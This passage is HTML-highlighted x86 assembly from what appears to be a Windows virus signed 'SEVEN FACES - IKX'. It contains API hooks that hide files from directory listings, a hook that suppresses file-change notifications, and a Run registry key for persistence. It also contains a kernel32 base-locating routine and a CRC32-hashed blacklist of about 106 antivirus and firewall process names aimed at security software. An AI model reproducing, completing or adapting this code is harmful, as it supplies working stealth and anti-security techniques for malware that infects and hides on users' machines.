                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">pushad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__s</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;base</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">;wfd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@finddatastealth</span><span class="sc0">

            </span><span class="sc5">__s</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;discard ret add of hook</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">hook_fnf</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">     </span><span class="sc1">;info</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">         </span><span class="sc1">;filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">pushad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__f</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@finddatastealth</span><span class="sc0">

            </span><span class="sc5">__f</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;discard ret add of hook</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc5">_startupregkey</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;findfirstchangenotification is handled in asm</span><span class="sc0">
</span><span class="sc5">hook_ffc</span><span class="sc4">:</span><span class="sc0">       

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],\
</span><span class="sc0">                        </span><span class="sc6">not</span><span class="sc4">(</span><span class="sc5">FILE_NOTIFY_CHANGE_LAST_WRITE\
</span><span class="sc0">                           </span><span class="sc4">+</span><span class="sc5">FILE_NOTIFY_CHANGE_SIZE\
</span><span class="sc0">                           </span><span class="sc4">+</span><span class="sc5">FILE_NOTIFY_CHANGE_ATTRIBUTES</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__q</span><span class="sc0">

                </span><span class="sc1">;if no monitorflags are left after our and'ing, add this</span><span class="sc0">
                </span><span class="sc1">;parameter, else the function fails i guess</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc1">;FILE_NOTIFY_CHANGE_FILE_NAME</span><span class="sc0">

</span><span class="sc5">__q</span><span class="sc4">:</span><span class="sc0">            

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">hook_leave</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;int getk32base(void);</span><span class="sc0">
</span><span class="sc5">@getk32base</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;get pointer into k32</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__x</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;get last se handler</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__x</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">;64k alignment</span><span class="sc0">
</span><span class="sc5">__z</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__y</span><span class="sc0">                             
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__z</span><span class="sc0">
</span><span class="sc5">__y</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@getk32base</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"- SEVEN FACES - IKX -"</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;void __fastcall memcpy(void* dst,void* src,int size);</span><span class="sc0">
</span><span class="sc5">@memcpy</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">




</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;thanks to some av description (106 entries)</span><span class="sc0">
</span><span class="sc5">_blacklist</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ZONEALARM.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">YAPS.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WFINDV32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WEBSCANX.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VSSTAT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VSHWIN32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VSECOMR.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VSCAN40.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VETTRAY.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VET95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">TDS2</span><span class="sc4">-</span><span class="sc5">NT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">TDS2</span><span class="sc4">-</span><span class="sc2">98.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">TCA.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">TBSCAN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SWEEP95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SPHINX.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SMC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SERV95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SCRSCAN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SCANPM.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SCAN95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SCAN32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SAFEWEB.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RESCUE.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAV7WIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAV7.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PERSFW.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PCFWALLICON.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PCCWIN98.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PAVW.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PAVSCHED.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PAVCL.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PADMIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">OUTPOST.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NVC95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NUPGRADE.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NORMIST.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NMAIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NISUM.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NAVWNT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NAVW32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NAVNT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NAVLU32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NAVAPW32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">N32SCANW.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MPFTRAY.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MOOLIVE.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LUALL.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LOOKOUT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LOCKDOWN2000.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">JEDI.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IOMON98.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IFACE.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ICSUPPNT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ICSUPP95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ICMON.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ICLOADNT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ICLOAD95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IBMAVSP.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IBMASN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IAMSERV.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IAMAPP.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FRW.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FPROT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FP</span><span class="sc4">-</span><span class="sc5">WIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FINDVIRU.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">STOPW.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">AGNT95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ESPWATCH.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ESAFE.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ECENGINE.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DVP95_0.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DVP95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CLEANER3.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CLEANER.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CLAW95CF.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CLAW95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CFINET32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CFINET.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CFIAUDIT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CFIADMIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">BLACKICE.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">BLACKD.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVWUPD32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVWIN95.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVSCHED32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVPUPD.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVPTC32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVPM.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVPDOS32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVPCC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVP32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVP.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVNT.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVKSERV.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVGCTRL.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVE32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AVCONSOL.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AUTODOWN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">APVXDWIN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ANTI</span><span class="sc4">-</span><span class="sc5">TROJAN.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ACKWIN32.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">_AVPM.EXE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">crc32m</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">_AVPCC.EXE</span><span class="sc4">&gt;</span><span class="sc0">
